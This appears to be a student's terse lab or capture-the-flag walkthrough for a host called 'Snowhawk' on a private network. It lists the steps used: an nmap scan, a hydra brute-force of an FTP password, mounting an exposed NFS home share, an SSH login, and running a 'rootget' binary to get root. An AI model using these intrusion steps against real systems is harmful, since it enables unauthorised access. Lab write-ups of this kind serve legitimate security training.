# Snowhawk 192.168.2.155
## Andrea Zonnekus 18758119

sudo nmap -Pn --script=safe -p- -sV -O -oN host 192.168.2.155

![](snowhawk_steps/Aspose.Words.2b03d7c3-c019-415e-acdb-b98d88021a5c.001.png)

![](snowhawk_steps/Aspose.Words.2b03d7c3-c019-415e-acdb-b98d88021a5c.002.png)

sudo hydra -l prator -P /usr/share/legion/wordlists/ftp-betterdefaultpasslist.txt ftp://192.168.2.155 -e nsr

![](snowhawk_steps/Aspose.Words.2b03d7c3-c019-415e-acdb-b98d88021a5c.003.png)

mkdir /tmp/prator

sudo mount -t nfs 192.168.2.155:/home/prator /tmp/prator

![](snowhawk_steps/Aspose.Words.2b03d7c3-c019-415e-acdb-b98d88021a5c.004.png)

ssh prator@192.168.2.155 -o HostKeyAlgorithms=+ssh-rsa

![](snowhawk_steps/Aspose.Words.2b03d7c3-c019-415e-acdb-b98d88021a5c.005.png)

./rootget

![](snowhawk_steps/Aspose.Words.2b03d7c3-c019-415e-acdb-b98d88021a5c.006.png)

id

![](snowhawk_steps/Aspose.Words.2b03d7c3-c019-415e-acdb-b98d88021a5c.007.png)



